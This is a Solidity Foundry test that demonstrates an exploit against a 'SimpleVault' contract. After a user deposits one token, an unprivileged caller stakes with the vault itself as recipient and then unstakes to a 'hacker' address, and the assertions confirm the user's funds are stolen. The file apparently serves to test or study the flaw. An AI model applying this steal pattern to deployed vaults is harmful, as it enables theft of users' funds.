// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {SimpleVaultTest} from "./SimpleVault.t.sol";
import {ISimpleVault} from "src/EVault/SimpleVault.sol";
import {console2} from "forge-std/Test.sol";

contract SimpleVault_DepositSelfHack is SimpleVaultTest {
    uint256 one = 1e18;
    address user = makeAddr("user");
    address hacker = makeAddr("hacker");

    function _log(string memory label) public view {
        console2.log(label, "| User   Balance :", assetTST.balanceOf(user));
        console2.log(label, "| Vault  Balance :", assetTST.balanceOf(address(eTST)));
        console2.log(label, "| Total  Assets  :", eTST.totalAssets());
        console2.log(label, "| Hacker Balance :", assetTST.balanceOf(hacker));
        console2.log("------------------------|-------------------------------------");
    }

    function test_depositSelfHack() public {
        assetTST.mint(user, one);
        _log("       User   Mint    1");

        hoax(user);
        assetTST.approve(address(eTST), one);

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == one);
        assert(assetTST.balanceOf(hacker) == 0);

        hoax(user);
        eTST.deposit(one, user);
        _log("       User   Deposit 1");

        ISimpleVault(address(eTST)).stake(one, address(eTST));
        _log("Buggy  Vault  Deposit 1");

        ISimpleVault(address(eTST)).unstake(one, hacker, address(eTST));
        _log("Hacker Vault  Steal   1");

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == 0);
        assert(assetTST.balanceOf(hacker) == one);
    }
}
